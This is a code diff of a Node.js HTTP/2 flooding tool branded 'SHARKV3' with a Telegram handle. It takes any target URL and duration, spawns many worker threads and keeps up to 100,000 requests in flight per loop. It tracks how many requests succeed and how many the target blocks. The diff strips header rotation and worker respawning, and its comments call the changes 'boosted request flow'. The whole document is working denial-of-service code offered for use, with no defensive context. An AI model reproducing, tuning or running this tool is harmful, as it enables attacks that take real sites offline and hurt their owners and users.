@@ -3,34 +3,18 @@ const { Worker, isMainThread, workerData } = require('worker_threads');
 const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
-const fs = require('fs');
 
-const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
-const referers = [
-    'https://www.google.com/',
-    'https://www.bing.com/',
-    'https://www.yahoo.com/',
-    'https://duckduckgo.com/',
-    'https://www.facebook.com/',
-    'https://www.reddit.com/',
-];
-
-const CPU_COUNT = cpus().length;
-const THREADS = CPU_COUNT * 2;
+const THREADS = 32;
 const INITIAL_CONNECTIONS = 45;
 const POWER_MULTIPLIER = 4;
-const MAX_INFLIGHT = 4000;
+const MAX_INFLIGHT = 100000; // Increased max inflight to handle more requests
 const LIVE_REFRESH_RATE = 1100;
-const WARMUP_TIME = 10000;
-
-const DYNAMIC_PORT = Math.floor(Math.random() * 1000) + 9000;
 
 let totalRequests = 0;
 let successCount = 0;
 let errorCount = 0;
 let maxRps = 0;
 let rpsLastSecond = 0;
-let vanishedCount = 0;
 
 if (isMainThread) {
     if (process.argv.length < 4) {
@@ -40,39 +24,21 @@ if (isMainThread) {
 
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
-    const endTime = Date.now() + duration * 1000;
 
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-    console.log(`PORT: ${DYNAMIC_PORT} | CPUx${CPU_COUNT} Threads`);
-    console.log(`WARMUP IN PROGRESS...`);
+    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
 
-    const workers = [];
-
-    function spawnWorker(data) {
-        const w = new Worker(__filename, { workerData: data });
-        w.on('exit', code => {
-            if (Date.now() < endTime) {
-                console.log(`[ANTI-KILL] Worker died. Respawning...`);
-                spawnWorker(data);
-            }
-        });
-        workers.push(w);
+    
+    for (let i = 0; i < THREADS; i++) {
+        new Worker(__filename, { workerData: { target, duration, initial: true } });
     }
 
-    setTimeout(() => {
-        console.clear();
-        console.log(`SHARKV3 - FULL THROTTLE | PORT ${DYNAMIC_PORT}`);
+    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
+        new Worker(__filename, { workerData: { target, duration, initial: false } });
+    }
 
-        for (let i = 0; i < THREADS; i++) {
-            spawnWorker({ target, duration, initial: true, port: DYNAMIC_PORT });
-        }
-
-        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-            spawnWorker({ target, duration, initial: false, port: DYNAMIC_PORT });
-        }
-    }, WARMUP_TIME);
-
+    // Live Stats
     setInterval(() => {
         maxRps = Math.max(maxRps, rpsLastSecond);
         renderStats();
@@ -89,7 +55,6 @@ if (isMainThread) {
         console.log(`===========================`);
         console.log(`succes: ${successCount}`);
         console.log(`Blocked: ${errorCount}`);
-        console.log(`Vape: ${vanishedCount}`);
     }
 
     const server = net.createServer(socket => {
@@ -98,15 +63,15 @@ if (isMainThread) {
             if (msg === 'req') totalRequests++, rpsLastSecond++;
             else if (msg === 'ok') successCount++;
             else if (msg === 'err') errorCount++;
-            else if (msg === 'vanish') vanishedCount++;
         });
     });
-    server.listen(DYNAMIC_PORT);
+    server.listen(9999);
 } else {
-    const { target, duration, initial, port } = workerData;
+    const { target, duration, initial } = workerData;
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
     const end = Date.now() + duration * 1000;
-    const socket = net.connect(port, '127.0.0.1');
+
+    const socket = net.connect(9999, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
 
     function sendLoop(client, inflight) {
@@ -115,31 +80,16 @@ if (isMainThread) {
         if (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
-                const headers = {
-                    ':method': 'GET',
-                    ':path': '/',
-                    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-                    'referer': referers[Math.floor(Math.random() * referers.length)]
-                };
-                const req = client.request(headers);
+                const req = client.request({ ':method': 'GET', ':path': '/' });
 
-                let sent = false;
-                req.setEncoding('utf8');
                 req.on('response', () => {
-                    sent = true;
                     inflight.count--;
                     sendStat('ok');
                 });
-                req.on('data', () => {}); // consume
+
                 req.on('error', () => {
                     inflight.count--;
                     sendStat('err');
-                });
-                req.on('close', () => {
-                    if (!sent) {
-                        inflight.count--;
-                        sendStat('vanish');
-                    }
                 });
 
                 req.end();
@@ -150,7 +100,7 @@ if (isMainThread) {
             }
         }
 
-        setTimeout(() => sendLoop(client, inflight), Math.random() * 5); // tiny jitter helps delivery
+        setImmediate(() => sendLoop(client, inflight)); // Use setImmediate for better loop timing
     }
 
     function createConnection() {
@@ -164,14 +114,14 @@ if (isMainThread) {
 
             client.on('error', () => {
                 client.destroy();
-                setTimeout(createConnection, 100);
+                setTimeout(createConnection, 100); // auto-recover fast
             });
 
             client.on('goaway', () => client.close());
             client.on('close', () => setTimeout(createConnection, 100));
 
             client.on('connect', () => {
-                for (let i = 0; i < 150; i++) sendLoop(client, inflight);
+                for (let i = 0; i < 150; i++) sendLoop(client, inflight); // boosted request flow
             });
         } catch {
             setTimeout(createConnection, 100);
